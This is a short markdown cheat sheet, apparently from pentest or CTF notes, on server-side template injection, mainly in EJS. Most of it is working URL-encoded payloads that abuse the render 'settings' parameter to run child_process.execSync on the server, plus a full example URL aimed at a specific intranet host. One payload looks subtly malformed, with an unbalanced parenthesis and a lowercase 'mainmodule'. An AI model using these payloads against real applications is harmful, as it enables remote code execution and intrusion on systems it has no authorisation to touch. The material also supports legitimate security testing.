
# Server side template injection

## Python

SSTI are often due to a Flask application misconfiguration



## EJS (Embedded Javascript Template)

A misconfiguration in the `render()` method allows users to overwrite some configuration values and execute code by adding a `setting` parameter in the get url.

https://eslam.io/posts/ejs-server-side-template-injection-rce/

- settings[view%20options][client]=true
- settings[view%20options][escapeFunction]=1;return%20global.process.mainModule.constructor._load(%27child_process%27).execSync(%27ls%27);

**Payload example**
```
https://magistral-intranet.casinolimit.bzh/balances/search?q=camille&settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20global.process.mainModule.constructor._load(%27child_process%27).execSync(%27ls%27);
```

**Payloads**
```
settings[view%20options][client]=true&settings[view%20options][escapeFunction]=1;return%20global.process.mainModule.constructor._load(%27child_process%27).execSync(%27ls%27);
settings[view%20options][escapeFunction]=console.log;this.global.process.mainModule.require(%27child_process%27).execSync("ls");&settings[view%20options][client]=true
settings[view options][outputFunctionName]=x;process.mainmodule.require('child_process').execSync('ls'));s
```

